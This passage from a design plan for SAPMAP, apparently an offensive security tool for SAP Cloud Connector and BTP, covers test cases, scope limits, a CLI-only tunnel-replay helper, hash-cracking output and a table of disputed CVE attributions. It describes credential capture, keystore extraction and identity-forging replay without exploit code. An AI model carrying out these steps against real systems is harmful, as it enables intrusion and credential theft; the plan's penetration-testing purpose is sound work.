- `sapmap_impact.py` — five new `@impact_scenario` decorators wrapping the
  cloud findings; numeric `risk_score` field added to `ImpactResult`.
- `sapmap_compliance.py` (NEW, ~150 LOC) — `COMPLIANCE_MAP` dict.
- `sapmap_html.py` — CISO tile (#ciso-tile div + CSS animation), markdown
  exporter "Cloud Connector & BTP — executive summary" section.
- `docs/research/08_cloud_connector_implementation_plan.md` — this file
  remains the spec; new operator-facing doc lives at
  `docs/operator/cloud_connector.md` (one page per finding category, 1
  paragraph + remediation each).

**Test cases.**
- Synthetic state with: 2 SCCs (1 default-creds-live, 1 patched), 3 BTP
  subaccounts (1 with 3 cleartext destinations, 1 IAS tenant). The exported
  markdown contains the executive summary block, the CISO tile shows
  `7 paths / 3 cleartext / 2 subaccounts via SCC compromise / risk 87`, and
  every finding carries at least one compliance tag.
- A path through all six animation triggers (default-creds detected, keystore
  extracted, tunnel replayed, destination password captured, mapping wildcard,
  PP CA exfil) → no JS console errors, all overlays auto-clear inside 3 s.

**Risks / blockers.** The CISO tile competes with the existing top-bar
elements (legend bar, stats bar) for horizontal real-estate. Mitigation: tile
collapses to a single 32-px-wide pill icon when window width < 1280 px;
expanded view available on hover.

---

## G. Out of scope

Replaces the brief §8.4 of `03_cloud_connector_btp.md` with a more concrete
scope fence. Listed *with* reasoning so future contributors know what to
revisit if the threat model changes.

### G.1 Active BTP exploitation

- **No `cf push` of payload apps.** Creating CF apps from SAPMAP would: (a)
  leave artifacts in the customer's CF org that may not be under
  pen-testing scope; (b) trigger licensing meters; (c) require persistent
  cleanup logic that's far harder to get right than `cf push`.
- **No Kyma/Kubernetes side.** Kyma sits on its own k8s control plane,
  requires a kubeconfig, and the attack surface (CRDs, MutatingAdmissionWebhook
  etc.) is distinct enough to deserve its own module if the project ever
  needs it. Park.
- **No SCIM bulk user create on IAS.** Read-only fingerprinting of the
  `.well-known` endpoints is OK; SCIM `POST /Users` is destructive and would
  trip every IAS audit alarm. If a future engagement specifically requires
  it, build a separate opt-in module.
- **No HANA Cloud direct access.** Out-of-band — different OAuth surface,
  different SDK. Belongs in the HANA module already on the Tier-C roadmap
  (item #14 in `00_priority_summary.md`).
- **No Build Apps / Work Zone CSRF chains.** Cloud-side noisy; cleaner left
  to a manual operator playbook.

### G.2 In-tool tunnel replay

The `sapmap_scc_tunnel_replay.py` helper is **CLI-only** and lives outside
the GUI. Reasons:

- Replay is legally riskier than every other SAPMAP operation: the operator
  is asserting a forged identity to BTP. Manual invocation makes it
  impossible to do by accident from a misclick.
- The act of replaying is *disruptive* to the legitimate SCC: BTP load
  balancers will round-robin between attacker and legit, causing partial
  outages. Operators should make that decision deliberately.
- Replay output is dependent on subaccount-specific routing internals; CLI
  parameters force the operator to make every choice explicit.

If a future engagement scope mandates in-GUI replay, the integration point
is a single drawer button that pops a "this will affect production traffic"
confirm dialog and shells out to the existing CLI.

### G.3 Auto-cracking of `users.json`

SCC's `users.json` PBKDF2-SHA256 hashes are crackable, but SAPMAP is not the
right place to host a cracking loop. Plan: produce a hashcat-ready hash file
under `loot/<host>/scc_users.hash` and emit a finding with the cracking
template — operator runs hashcat themselves.

### G.4 Auto-modification of mappings or trust

Even when SAPMAP holds an admin session on SCC, it WILL NOT modify mappings,
add trust entries, or upload certificates. Read-only. Modifications change
on-prem reachability and must remain a manual operator decision.

### G.5 The Identity Provisioning Service (IPS) as an active surface

The dossier mentions IPS as a chain target. SAPMAP fingerprints IPS
(`*.<tenant>.accounts.ondemand.com/ips`) but does not push users; same
reasoning as G.1.

---

## H. Verification / open questions

Open before locking the implementation:

| # | Item | Why uncertain | Where to verify |
|---|---|---|---|
| 1 | **CVE-2023-49583 actual product** | The dossier (§1.2) attributes this to SCC admin-REST authz bypass. Web search indicates the CVE is `@sap/xssec` Node.js library escalation, with a fixed version of 3.6.0 — not SCC. **Likely the dossier confused two CVEs of similar timing.** | NVD `CVE-2023-49583`; CVE Details |
| 2 | **CVE-2024-33003 actual product** | The dossier (§1.2) lists it as SCC log-traversal → JCEKS read. Web search indicates it is **SAP Commerce Cloud OCC API PII-in-URL**, not SCC. **The dossier appears to be wrong on this CVE; do not reference 33003 as an SCC CVE in code.** | NVD `CVE-2024-33003`; SentinelOne advisory |
| 3 | **CVE-2024-25645** | NVD page redirects to a placeholder; details not retrievable from quick search. CVE is real (in CVE-Details vendor list for SAP) but the dossier's claim "auth bypass via Authorization header tampering" is not verified. | NVD direct fetch (paid/manual), Onapsis January 2026 patch-day blog |
| 4 | **CVE-2024-25642** | Confirmed real and SCC-specific (certificate-validation issue, Note 3424610). Should replace the dossier's incorrect 33003 reference. | RedRays blog, NVD CVE-2024-25642 |
| 5 | **August 2025 SCC patch (Note 3611345)** | Search confirms the note exists but doesn't give the CVE id. Likely allocated a 2025 CVE; recheck before week-2 implementation so `cves_suspected` table is correct. | SAP Support Portal Note 3611345; SecurityBridge / RedRays blog August 2025 |
| 6 | **CVE-2025-0064 (service-channel)** | Number used in dossier is "approximate"; not found in the search results above. The *concept* (service-channel authz issue) may be real; the *number* may be a placeholder. | NVD search for any 2024–2025 SCC CVE with "service channel"/"channel" in description |
| 7 | **CVE-2024-33006 product** | Dossier links it to IAS path-traversal/tenant takeover. Web search shows it affects **SAP_BASIS 700–758** (NetWeaver Portal / SAP Basis) and was a May-2024 fix — *not* IAS. Re-verify before claiming IAS impact. | SOCRadar May 2024 patch-day blog; NVD CVE-2024-33006 |
| 8 | **Location-ID isolation post-2022 fixes** | Dossier claims the cross-subaccount routing bug was tightened in 2022 but offers no citation. Need to know the exact version that introduced the strict isolation so the CVE bucket logic doesn't false-positive on patched versions. | SAP Note 2835106; SCC release notes 2.13/2.14 |
| 9 | **SCC 2.18 admin endpoint paths** | Search confirms 2.18 release exists (Windows Server 2025 support, automatic subaccount renewal); the admin REST routes may have changed. Probe set in §A.1 was based on 2.16-era paths. | Build a fresh 2.18 install, capture HTTP traffic on first login |
| 10 | **CSRF token cookie name on 2.18** | The plan assumes `SCC-CSRF-Token`. May be `SCC-CSRF` or carried in a header only. Affects `sapmap_scc_admin.py` login flow. | Manual capture against 2.18 |
| 11 | **`destination_configuration.ApiAccess` scope name** | This scope name has been stable since ~2020 but BTP CF naming has shifted around for several services. Validate against current `xs-security.json` for `destination` service binding. | SAP help portal: BTP destination service consumer guide |
| 12 | **`/api/btp/connectivity/v1/cloudConnectorMappings`** | The exact API path for the BTP-side view of connected SCCs is not documented in the search results. May need replacement with a different cf CLI plugin path. | `cf curl /v3/info` on a real BTP subaccount |
| 13 | **Java keystore (JCEKS) format used by SCC 2.17 (SapMachine 21)** | SCC 2.17 ships with SapMachine 21 (per the 2.17 release-blog confirmed in search). SapMachine 21 may not include the legacy JCEKS provider by default. JCEKS unwrap may need explicit `provider=BC` or fall back to the SAP-bundled provider. | Build SCC 2.17.1 in lab, run unwrap test |
| 14 | **MYSAPSSO2 cross-domain trust currency in 2026** | The dossier flags this as "less common in 2025." 2026 status unknown. May be near-zero in real estates, in which case the chain is not worth a node-type extension. | Survey 5–10 real customer engagements |
| 15 | **Existing `EXPLOIT_REGISTRY` shape** | The dossier's §8.3 mentions `ExploitKind.SCC_*`. Quick grep shows no `EXPLOIT_REGISTRY` / `ExploitKind` symbol in `sapmap_exploit.py`. The pattern may be implicit (per-function dispatch). Verify before week-3 wiring. | Re-read `sapmap_exploit.py` lines 1–50 plus the GUI dispatcher in `sapmap_html.py` |

Action: before week 1 starts, spend half a day fetching NVD entries 1–7
above and updating the `sapmap_scc_cve_buckets.py` table. The plan deliberately
keeps that table in *one* place so corrections cost minutes, not a refactor.

---

**Bottom line.** SCC + BTP is the largest single coverage gap in SAPMAP. The
detection ladder of §A is cheap, the data-model extension (§C) is small (four
dataclasses, one edge-kind discriminator on `RFCConnection`), the
visualization (§D) reuses existing pulse/badge primitives, and the
business-impact story (§E) plugs into the same scenario-registry pattern as
the on-prem impact engine. The plan is intentionally read-only-by-default at
every stage; active exploitation is gated behind explicit operator opt-ins
(§G). Six weeks of focused work yields the first public tool that visualizes
on-prem-to-BTP and BTP-to-on-prem attack paths in a single map — fingerprint
through cleartext-credential capture through tunnel-replay-PoC, with CISO-grade
risk scoring on top.
